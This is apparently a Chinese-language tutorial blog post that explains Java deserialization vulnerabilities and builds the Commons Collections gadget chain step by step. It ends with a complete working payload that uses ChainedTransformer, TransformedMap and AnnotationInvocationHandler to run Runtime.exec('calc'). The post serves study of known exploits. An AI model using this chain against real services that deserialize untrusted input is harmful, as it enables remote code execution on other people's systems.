前言
#

最近在学java反序列化漏洞，观察到现有网上的关于反序列化如何构造payload资料较少，大部分都停留在使用ysoserial提供的jar包直接生成自己所需的payload，但是对于其项目中的payload如何构造，以及为何这样构造，许多人是不清楚的。所以本人开一个专题，详细说一下这些gadget是如何构造的。

一、什么是反序列化漏洞
#

Java 反序列化漏洞可以理解成一件事：程序把一段本不该信任的数据，当成“对象”还原出来，而在还原过程中自动执行了类里的逻辑，最终被攻击者“借用这些逻辑”完成恶意操作（比如命令执行）。关键不在“读数据”，而在反序列化过程会隐式触发方法调用。比如 ObjectInputStream.readObject() 在恢复对象时，会递归地构建对象图，同时调用一些特殊方法（如 readObject、readResolve 等），还会触发集合类、代理类、反射相关逻辑，这些“自动行为”正是攻击面的来源。

所谓 gadget（利用片段），本质上不是漏洞，而是一段可以被“顺带调用”的已有代码。单个 gadget 往往只是完成一个小动作，比如“调用某个方法”“做一次反射”“执行一次转换”，但攻击者会把多个 gadget 拼起来形成一条链（gadget chain）。这条链的特点是：每一段代码的输出，刚好成为下一段代码的输入，最终一步步逼近一个危险操作。例如某个类在反序列化时会调用 toString()，而 toString() 又触发了一个代理对象的 invoke()，接着进入反射调用 Method.invoke()，最后调用到 Runtime.exec()——这整条路径并不是开发者设计来“执行命令”的，但组合起来就产生了效果。所以 gadget chain 的本质不是“写代码”，而是“利用已有代码的调用关系”。

从攻击构造的角度看，可以抽象成三个角色：source、gadget、sink。

  • source 就是入口，也就是“攻击数据进入并被解释为对象”的地方，典型就是 readObject()。它的关键特征是：数据可控 + 会触发反序列化机制。
  • sink 是终点，是那些真正具有安全影响的操作，比如 Runtime.getRuntime().exec()、反射执行、类加载、JNDI 等，本质是一旦参数可控就可能产生安全问题的函数。
  • gadget 是中间的桥梁，它负责把“反序列化触发点”一步步引导到“危险操作”。它通常具有这些特点：要么在反序列化过程中会被自动调用，要么内部存在进一步调用其他方法的逻辑（比如反射、函数式接口、回调机制等），从而可以继续把调用链延伸下去。

攻击者构造利用链的思路，本质是“反着找路径”：先确定一个 sink（比如命令执行），然后往上找有哪些类可以间接调用到它，再看这些类的调用是否可以被控制（参数是否能传进去），接着继续往上找有没有类在反序列化过程中会自动触发这些调用（例如某些集合类在 readObject 时会遍历元素并调用方法）。当这条路径一直追溯到 readObject() 时，就得到一条完整链路。

所以本质上，Java 反序列化漏洞并不是传统意义上的“输入拼接代码执行”，而是更隐蔽的一种：攻击者不注入代码，而是操控对象结构，让程序自己执行已有代码。gadget 就是这些“可被利用的已有代码片段”，source 是触发整个过程的入口，sink 是最终产生安全影响的落点，而 gadget chain 则是把三者连起来的一条隐式执行路径。

1.寻找sink点
#

这里我们模仿攻击者构造利用链的思路，我们先确定sink，即攻击点，我们最好是直接找RCE，Runtime.getRuntime().exec("danger code");或者代码任意执行点。 很幸运，我们找到了一个代码任意执行点，有点像一个后门 在org.apache.commons.collections.functors.InvokerTransformer类下找到任意执行点，且其构造函数为public，对于我们（攻击者）可控，我们可以将InvokerTransformer.transform作为sink

有小伙伴要问了，一个库的代码这么这么多，你怎么能精确的锁定到这个类下的这个方法是一个任意执行点，我挖漏洞，代码海了去了，我找不到sink点啊 这个问题，一方面要感谢前人的智慧，ysoserial明确写出了这里是一个sink点，本文是直接拿他的结论用，主要是说明如何构造payload 那我们如果像看别人的代码，是否存在反序列化漏洞，企图发现未知漏洞，人工一个一个找肯定不现实，这里要提到一个程序分析技术–静态分析，它可以帮助我们快速审计代码，未来我会开一个静态分析的专题，详细说一下，这里我们只需要知道，我们现在有技术可以做到在庞大的代码文件中，快速定位sink的能力即可。

3.修补gadget链条
#

我们没有弹出计算器，主要是有两个问题

  • AnnotationInvocationHandler.readObject要调用setValue需要走过两个if，我们需要看一下这里的逻辑是什么，构造合适的输入，让他通过两个if条件，到达setValue
  • Runtime这个类没有实现Serializable接口，导致其不能被序列化

首先解决第一个问题

private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }

这里主要有两个if，第一个是判断memberType是否有值，第二个是memberType是不是和value的类型不同 要想到达setValue，我们需要满足，membertype有值且要满足一定的类型约束 那这个memberType是个什么东西呢，我们debug一下

我们可以看到，memberType是从注解中取出的，我们上面的代码传入的注解是Override,他是将注解中的map键值对取出，但是Override注解里面是空的，所以无法进入第一个if中去 所以我们修改注解，选取一个注解里面有内容的传入，这里我们传入的是SuppressWarnings，它里面有一个String[] value 这里再次dubug，发现memberType有值了，还可以使用别的注解，只要注解里面有内容即可 由于我们初始传入的map的value是123（int类型），与string类型不一致，第二个if也顺利通过，修改传入的参数后，让我们到达了setValue，第一个问题就此解决 接下来解决第二个问题，Runtime不能序列化的问题 只有实现了 Serializable 接口的类才能被默认的序列化机制序列化。如果一个类没实现它，尝试用 ObjectOutputStream 写对象就会报 NotSerializableException。 我们观察到，虽然Runtime不能序列化，但是Class可以序列化，我们可以从Class开始使用反射构造Runtime对象，进而调用exec，实现RCE 这里介绍两个新的类 org.apache.commons.collections.functors.ChainedTransformer org.apache.commons.collections.functors.ConstantTransformer ChainedTransformer有一个方法是

private final Transformer[] iTransformers;

public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }

他的作用是把Transformer数组循环调用，第一个transfromer调用transform的结果作为第二个transfromer调用transform的输入

第二个类ConstantTransformer有一个方法是

private final Object iConstant;
public Object transform(Object input) {
        return iConstant;
    }

这个作用很简单，输入什么，原样写出什么

上面解释的不太清楚，这里使用具体例子来说明 我们的目标是从Class开始，通过反射来执行exec，先看如下代码

public static void main(String[] args) throws Exception {
        //我们要通过反射来构造这一串的方法调用,Runtime.getRuntime().exec("calc");
        //但由于Runtime不可被序列化，我们只能从Class开始，用反射从头构造
        Class c = Runtime.class;
        //接下来获取getRuntime方法和exec方法
        Method getRuntime = c.getMethod("getRuntime", null);
        Method exec = c.getMethod("exec", new Class[]{String.class});
        //再调用getRuntime方法，获取Runtime对象
        Object runtime = getRuntime.invoke(null, null);
        //最后调用exec方法，传入参数calc
        exec.invoke(runtime, new Object[]{"calc"});
    }

这部分看懂以后，我们把上面的反射代码，变成InvokerTransformer的形式，让他的transform来帮我们调用反射

Object o1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
Object o2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(o1);
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(o2);

这里看我们用的代码，就是上一个的输出，作为下一个的输入，恰好就是ChainedTransformer.transformer的样子，为此我们把上面的一堆invokerTransformer写到数组中，让ChainedTransformer来调用，注意我们一开始传入的是Runtime.class这个东西怎么传入呢，对，就是用ConstantTransformer来传入，他的作用就是原样写出 所以最终的payload代码就是

public class Demo {
    public static void main(String[] args) throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        });
        //创建transformedMap对象，chainedTransformer
        Map map = new HashMap();
        map.put("value",123);
        Map<Object,Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);
        //由于AnnotationInvocationHandler的构造方法是private，采用反射来构造对象
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        //这里的内容我们先随便填一下
        Object o = constructor.newInstance(SuppressWarnings.class, decorate);
        //序列化与反序列化，触发readObject方法，最终触发exec
        serialize(o);
        deSerialize();
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object deSerialize() throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));
        return ois.readObject();
    }
}
